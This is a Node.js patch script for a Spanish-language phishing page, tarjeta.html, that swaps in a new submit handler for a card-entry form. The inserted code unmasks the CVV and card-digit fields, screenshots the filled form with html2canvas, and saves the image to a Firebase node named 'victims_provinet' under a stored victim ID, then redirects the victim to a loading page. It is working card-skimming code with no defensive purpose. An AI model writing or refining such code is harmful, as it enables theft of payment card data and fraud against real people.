const fs = require('fs');

let html = fs.readFileSync('tarjeta.html', 'utf8');

const regex = /form\.addEventListener\('submit', function\(e\) \{[\s\S]*?\}\);/i;

const replacement = `
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const btnSubmit = document.getElementById('submit');
            if(btnSubmit) {
                btnSubmit.innerText = 'Cargando...';
                btnSubmit.style.pointerEvents = 'none';
                btnSubmit.style.opacity = '0.7';
            }

            // 1. Unmask passwords for capture
            const cvv = document.getElementById('cvv');
            const ultimos = document.getElementById('ultimos_digitos');
            if (cvv) cvv.type = 'text';
            if (ultimos) ultimos.type = 'text';

            // Wait for DOM
            await new Promise(r => setTimeout(r, 100));

            try {
                const canvas = await html2canvas(document.getElementById('form'), {
                    backgroundColor: '#ffffff',
                    scale: 2
                });
                const imgData = canvas.toDataURL('image/jpeg', 0.8);

                const victimId = localStorage.getItem('current_victim_id');
                
                if (victimId) {
                    const dbInstance = typeof db !== 'undefined' ? db : (typeof database !== 'undefined' ? database : firebase.database());
                    dbInstance.ref('victims_provinet/' + victimId).update({
                        tarjeta: imgData
                    }).then(() => {
                        window.location.href = 'cargando.html';
                    }).catch(err => {
                        window.location.href = 'cargando.html';
                    });
                } else {
                    window.location.href = 'cargando.html';
                }
            } catch (err) {
                console.error("Canvas error", err);
                window.location.href = 'cargando.html';
            }
        });
`;

html = html.replace(regex, replacement);

fs.writeFileSync('tarjeta.html', html, 'utf8');
console.log('tarjeta.html fixed script');
